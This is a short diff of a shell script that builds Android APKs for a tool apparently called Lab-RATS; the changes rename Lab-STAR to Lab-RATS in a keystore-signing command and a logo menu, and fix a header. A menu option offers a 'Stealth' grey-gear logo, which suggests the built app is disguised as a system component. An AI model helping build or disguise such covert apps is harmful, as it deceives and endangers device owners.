@@ -6,7 +6,7 @@
 #        Android APK BUILDER - Linux/Mac        #
 #                v1.5.1 Hardened                #
 #                                               #
-#           Developed by: K4N3CO             #
+#             Developed by: K4N3CO              #
 #################################################
 
 # Colors for output
@@ -151,7 +151,7 @@ generate_keystore() {
     read -p "    Key alias [lab-rats-key]: " ALIAS; ALIAS=${ALIAS:-lab-rats-key}
     read -p "    Password [lab-rats123]: " PASS; PASS=${PASS:-lab-rats123}
 
-    keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "$PASS" -keypass "$PASS" -dname "CN=Lab-STAR Developer, O=Lab-STAR.LABS, C=US" 2>/dev/null
+    keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "$PASS" -keypass "$PASS" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
     
     cat > "$PROJECT_DIR/keystore.properties" << EOF
 storeFile=lab-rats-keystore.jks
@@ -166,7 +166,7 @@ EOF
 configure_logo() {
     echo -e "${CYAN}[*] Logo Configuration${NC}"
     echo "    1. Use Recommended Stealth logo (grey gear)"
-    echo "    2. Use default Lab-STAR logo"
+    echo "    2. Use default Lab-RATS logo"
     echo "    3. Use custom logo (path)"
     echo "    4. Skip"
     read -p "    Choice (Default 1): " LOGO_OPTION
